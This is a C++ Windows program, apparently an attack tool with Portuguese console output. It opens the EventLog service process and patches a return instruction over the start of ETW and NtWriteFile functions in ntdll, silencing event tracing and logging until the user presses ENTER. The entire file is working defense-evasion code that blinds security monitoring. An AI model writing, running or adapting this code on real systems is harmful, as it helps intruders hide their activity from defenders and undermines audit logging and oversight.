#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <tlhelp32.h>

struct PatchInfo {
    std::string funcName;
    void* targetAddr = nullptr;
    unsigned char originalByte;
    bool patched = false;
};

struct {
    HANDLE hProcess = NULL;
    std::vector<PatchInfo> patches;
    bool active = false;
} g_EtwState;

void EtwPatch(bool apply) {
    DWORD pid = 0;
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hService = OpenService(hSCM, L"EventLog", SERVICE_QUERY_STATUS);
        if (hService) {
            SERVICE_STATUS_PROCESS ssp;
            DWORD dwBytes;
            if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &dwBytes)) {
                pid = ssp.dwProcessId;
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    if (pid == 0) return;

    if (apply && !g_EtwState.active) {
        g_EtwState.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!g_EtwState.hProcess) return;

        std::vector<std::string> targetFuncs = {
            "EtwEventWrite",
            "EtwEventWriteFull",
            "EtwEventRegister",
            "EtwEventWriteTransfer",
            "NtWriteFile"
        };

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

        for (const auto& funcName : targetFuncs) {
            void* addr = (void*)GetProcAddress(hNtdll, funcName.c_str());
            if (addr) {
                PatchInfo p;
                p.funcName = funcName;
                p.targetAddr = addr;

                DWORD oldProtect;
                VirtualProtectEx(g_EtwState.hProcess, addr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
                ReadProcessMemory(g_EtwState.hProcess, addr, &p.originalByte, 1, NULL);

                unsigned char patchByte = 0xC3;
                WriteProcessMemory(g_EtwState.hProcess, addr, &patchByte, 1, NULL);

                VirtualProtectEx(g_EtwState.hProcess, addr, 1, oldProtect, &oldProtect);

                p.patched = true;
                g_EtwState.patches.push_back(p);
                std::cout << "[+] Patch aplicado em: " << funcName << std::endl;
            }
        }
        g_EtwState.active = true;
    }
    else if (!apply && g_EtwState.active) {
        for (auto& p : g_EtwState.patches) {
            if (p.patched) {
                DWORD oldProtect;
                VirtualProtectEx(g_EtwState.hProcess, p.targetAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
                WriteProcessMemory(g_EtwState.hProcess, p.targetAddr, &p.originalByte, 1, NULL);
                VirtualProtectEx(g_EtwState.hProcess, p.targetAddr, 1, oldProtect, &oldProtect);
                std::cout << "[-] Resturado: " << p.funcName << std::endl;
            }
        }
        CloseHandle(g_EtwState.hProcess);
        g_EtwState.patches.clear();
        g_EtwState.active = false;
    }
}

int main() {
    std::cout << "[>] Iniciando Bypass de ETW/EventLog..." << std::endl;
    EtwPatch(true);

    std::cout << "\n[!] ETW e EventLog silenciados. Pressione ENTER para restaurar...\n";
    std::cin.get();

    EtwPatch(false);
    std::cout << "[>] Sistema restaurado com sucesso." << std::endl;

    return 0;
}